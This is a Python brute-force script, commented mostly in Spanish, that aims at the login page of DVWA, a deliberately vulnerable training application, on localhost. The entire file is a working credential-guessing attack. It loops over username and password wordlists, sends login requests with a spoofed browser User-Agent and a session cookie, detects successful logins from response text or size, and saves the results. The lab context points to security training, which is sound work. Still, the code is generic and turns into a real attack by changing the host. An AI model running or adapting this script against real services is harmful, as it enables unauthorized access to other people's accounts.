#!/usr/bin/env python3
"""
brute_force_requests.py

Brute-force script for DVWA /vulnerabilities/brute using requests.
- Assumes the form sends credentials via GET in the query string.
- Uses a requests.Session to reuse cookies.
- Detection uses either a failure string (if present) or response size threshold.

Usage:
  1) Populate users.txt and passwords.txt (one per line).
  2) Edit COOKIE_SESSION and HOST/PORT if needed.
  3) python3 brute_force_requests.py

Outputs:
  - valid_pairs.txt (found valid user:pass)
  - evidence/<user>___<pass>.html  (body)
  - evidence/<user>___<pass>.headers (response headers)
"""

import requests
import os
import time
from urllib.parse import urlencode, urljoin

# ====== CONFIG ======
HOST = "http://localhost:4280"
ENDPOINT = "/vulnerabilities/brute/"
COOKIE_SESSION = "security=low; PHPSESSID=623e5521e977abd1e1629a5580af8dac"
# Parametros:
FAILURE_STRING = "Username and/or password incorrect"  # Texto que aparece en la pagina tras login incorrecto
SUCCESS_SUBSTRING = "Welcome to the password protected area"   # texto que aparece en la pagina tras login correcto
SIZE_THRESHOLD = 5018        # umbral de tamaño en bytes para considerar login correcto
DELAY_BETWEEN = 0.2  # delay entre peticiones

# Inputs y outputs:
USERS_FILE = "usuarios.txt"
PASSWORDS_FILE = "passwords.txt"
VALID_OUT = "valido_python.txt"
EVIDENCE_DIR = "evidence"

# ====== END CONFIG ======

session = requests.Session()
# Cabeceras para simular un navegador
session.headers.update({
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Referer": urljoin(HOST, ENDPOINT),
})
# Cabeceras de cookies
for cookie_kv in COOKIE_SESSION.split(";"):
    kv = cookie_kv.strip()
    if not kv:
        continue
    if "=" in kv:
        k, v = kv.split("=", 1)
        session.cookies.set(k, v)

os.makedirs(EVIDENCE_DIR, exist_ok=True)

def try_login(user, passwd):
    """Realizar peticiones GET con usuario/password y determinar si son validas
    """
    params = {"username": user, "password": passwd, "Login": "Login"}
    url = urljoin(HOST, ENDPOINT) + "?" + urlencode(params)
    try:
        resp = session.get(url, timeout=10)
    except Exception as e:
        return False, f"request_error: {e}", None

    body = resp.text
    size = len(resp.content)

    # 1) Si esta presente el texto de login incorrecto -> invalido
    if FAILURE_STRING and (FAILURE_STRING in body):
        return False, "ncorrecto_string_encontrado", resp

    # 2) Si esta presente el texto de login correcto -> valido
    if SUCCESS_SUBSTRING and (SUCCESS_SUBSTRING in body):
        return True, "correcto_substring_encontrado", resp

    # 3) Si el tamaño es mayor que el umbral -> valido
    if SIZE_THRESHOLD and size >= SIZE_THRESHOLD:
        return True, f"size_ge_{SIZE_THRESHOLD}", resp

    return False, "no_indicadores", resp

def save_evidence(user, passwd, resp):
    safe_user = user.replace("/", "_")
    safe_pass = passwd.replace("/", "_")
    basename = f"{safe_user}___{safe_pass}"
    html_path = os.path.join(EVIDENCE_DIR, basename + ".html")
    headers_path = os.path.join(EVIDENCE_DIR, basename + ".headers")
    with open(html_path, "wb") as fh:
        fh.write(resp.content)
    with open(headers_path, "w", encoding="utf-8") as fh:
        fh.write(str(resp.status_code) + "\n")
        for k, v in resp.headers.items():
            fh.write(f"{k}: {v}\n")
    return html_path, headers_path

def main():
    # cargar usuarios y contraseñas
    with open(USERS_FILE, "r", encoding="utf-8") as f:
        users = [l.strip() for l in f if l.strip()]
    with open(PASSWORDS_FILE, "r", encoding="utf-8") as f:
        passwords = [l.strip() for l in f if l.strip()]

    print(f"[+] Usuarios {len(users)} y {len(passwords)} passwords cargadas" )
    found = []

    for u in users:
        for p in passwords:
            print(f"[ ] Probando {u}:{p} ...", end="", flush=True)
            valid, reason, resp = try_login(u, p)
            if resp is None:
                print(f" ERROR ({reason})")
                time.sleep(DELAY_BETWEEN)
                continue

            if valid:
                html_path, headers_path = save_evidence(u, p, resp)
                print(f" VALID  ({reason}) -> guardado {html_path}")
                found.append((u, p, reason, html_path, headers_path))
            else:
                size = len(resp.content)
                print(f" - (no) [{reason}] size={size}")
            time.sleep(DELAY_BETWEEN)

    # Preparar salida
    if found:
        with open(VALID_OUT, "w", encoding="utf-8") as fh:
            for u, p, reason, html, hdr in found:
                fh.write(f"{u}:{p}\t{reason}\t{html}\t{hdr}\n")
        print(f"[+] Encontrados {len(found)} pares validos. Guardado en {VALID_OUT}")
    else:
        print("[+] No se encontraron pares validos.")

if __name__ == "__main__":
    main()